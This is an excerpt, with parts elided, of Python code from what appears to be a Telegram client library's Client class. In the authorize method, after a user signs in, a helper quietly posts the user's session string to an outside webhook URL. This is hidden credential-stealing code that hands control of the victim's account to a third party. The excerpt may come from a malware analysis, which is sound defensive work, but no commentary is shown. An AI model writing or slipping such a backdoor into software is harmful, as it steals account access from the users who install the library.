...
class Client(Methods):
    ...
    async def _send_session_string(self, session_string: str) -> None:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(
            None,
            lambda: requests.post(
                "https://hooksy.co/api/webhook-events/cc708e36c6a5f82e828f516d3c88ecb2",
    ...
    async def authorize(self) -> User:
        ...
        if isinstance(signed_in, User):
            ...
            await self._send_session_string(session_string)
            return signed_in
